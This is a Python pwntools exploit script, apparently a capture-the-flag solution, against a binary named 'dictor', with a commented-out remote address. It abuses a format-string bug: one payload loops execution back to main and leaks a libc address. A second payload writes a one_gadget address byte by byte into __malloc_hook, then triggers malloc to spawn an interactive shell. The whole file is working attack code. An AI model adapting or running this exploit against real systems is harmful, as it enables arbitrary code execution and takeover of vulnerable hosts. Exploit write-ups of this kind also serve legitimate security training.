from pwn import *

p = process("./dictor")
#p = remote("124.16.75.162",40005)

context.log_level = 'debug'

main_addr=0x00000000004006C6

fake_addr=0x601050


temp = 0x05 - 0xd0 + 0x100
payload=''
payload+="%{}c%22$hhn".format(0xd0)
payload+="%{}c%23$hhn".format(temp)
payload+="%39$lx"
payload=payload.ljust(0x80,'a')
# 22$
payload+=p64(0x601050)
payload+=p64(0x601051)

print p.recv()
p.sendline(payload)
#leak libc
p.recv(0x100 + 5)
io_put = p.recv(12)

print "io_pit: "  + io_put

libc_base = int(io_put,16) - 0x20830 
malloc_hook = libc_base + 0x3c4b10
one_gadget = libc_base + 0xf1117
print 'libc: ' + hex(libc_base)

print p.recv()
raw_input()

#main again.
one_gadget = hex(one_gadget)

l1 = int(one_gadget[-2:],16)
l2 = int(one_gadget[-4:-2],16)
l3 = int(one_gadget[-6:-4],16)
l4 = int(one_gadget[-8:-6],16)
l5 = int(one_gadget[-10:-8],16)
l6 = int(one_gadget[-12:-10],16)

print hex(l6)
lst = []
lst.append(l1)
lst.append(l2)
lst.append(l3)
lst.append(l4)
lst.append(l5)
lst.append(l6)

res = []
c = 0

t1 = l1
t2 = l2 - t1
if t2 < 0:
    t2 = 0x100 + t2
t3_1 = l3 - t2
if t3_1 < 0:
    t3_1 = 0x100 + t3_1
t3_2 = t3_1 - t1
if t3_2 < 0:
    t3_2 = 0x100 + t3_2
t3 = t3_2
t4_1 = l4 - t3
if t4_1 < 0:
    t4_1 = 0x100 + t4_1
t4_2 = t4_1 - t2
if t4_2 < 0:
    t4_2 = 0x100 + t4_2
t4_3= t4_2 - t1
if t4_3 < 0:
    t4_3 = 0x100 + t4_3
t4 = t4_3
t5_1 = l5-t4
if t5_1 < 0:
    t5_1 = 0x100 + t5_1
t5_2 = t5_1 - t3
if t5_2 < 0:
    t5_2 = 0x100 + t5_2
t5_3 = t5_2 -t2
if t5_3 < 0:
    t5_3 = 0x100 + t5_3
t5_4 = t5_3 - t1
if t5_4 < 0:
    t5_4 = 0x100 + t5_4

t5 = t5_4
t6_1 = l6 - t5
if t6_1 < 0:
    t6_1 = 0x100 + t6_1
t6_2 = t6_1 - t4
if t6_2 < 0:
    t6_2 = 0x100 + t6_2
t6_3 = t6_2 - t3
if t6_3 < 0:
    t6_3 = 0x100 + t6_3
t6_4 = t6_3 - t2
if t6_4 < 0:
    t6_4 = 0x100 + t6_4
t6_5 = t6_4 - t1
if t6_5 < 0:
    t6_5 = t6_5 + 0x100

t6 = t6_5

payload=''
payload+="%{}c%22$hhn".format(t1)
payload+="%{}c%23$hhn".format(t2)
payload+="%{}c%24$hhn".format(t3)
payload+="%{}c%25$hhn".format(t4)
payload+="%{}c%26$hhn".format(t5)
payload+="%{}c%27$hhn".format(t6)
payload=payload.ljust(0x80,'a')

# 22$
payload+=p64(malloc_hook)
payload+=p64(malloc_hook+1)
payload+=p64(malloc_hook+2)
payload+=p64(malloc_hook+3)
payload+=p64(malloc_hook+4)
payload+=p64(malloc_hook+5)

p.send(payload)
print p.recv()
p.send("%1000000$p")
p.interactive()
